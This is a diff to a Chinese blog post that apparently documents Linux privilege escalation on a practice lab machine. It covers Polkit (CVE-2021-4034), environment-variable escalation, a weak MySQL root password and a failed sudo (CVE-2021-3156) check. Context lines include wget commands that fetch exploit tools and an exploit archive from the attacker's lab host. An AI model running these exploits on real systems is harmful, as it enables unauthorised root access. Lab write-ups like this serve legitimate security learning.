@@ -141,7 +141,7 @@ wget http://192.168.235.1/linux-exploit-suggester.sh
 
 ![1726375663428.jpg](\images\posts\Linux提权(escalate_linux_1靶机)\1726375663428.jpg)
 
-## CVE-2021-4034提权
+## Polkit(CVE-2021-4034)提权
 
 ```
 wget http://192.168.235.1/CVE-2021-4034-main.zip
@@ -151,8 +151,6 @@ whoami
 ```
 
 ![1726376543136.jpg](\images\posts\Linux提权(escalate_linux_1靶机)\1726376543136.jpg)
-
-其余CVE没尝试
 
 ## 环境变量提权
 
@@ -278,15 +276,13 @@ root密码在 /etc/mysql/secret.cnf里面，弱口令12345
 
 ## SUDO(CVE-2021-3156)提权(失败)
 
-```
+```shell
 sudo --version
 版本在
 1.8.2-1.8.31p2
 1.9.0-1.9.5p1之间
-sudoedit -s /  报错则存在漏洞
+sudoedit -s /
 ```
-
-版本在区间，命令也报错，不知道为什么不行
 
 ![1726400810453.jpg](\images\posts\Linux提权(escalate_linux_1靶机)\1726400810453.jpg)
 
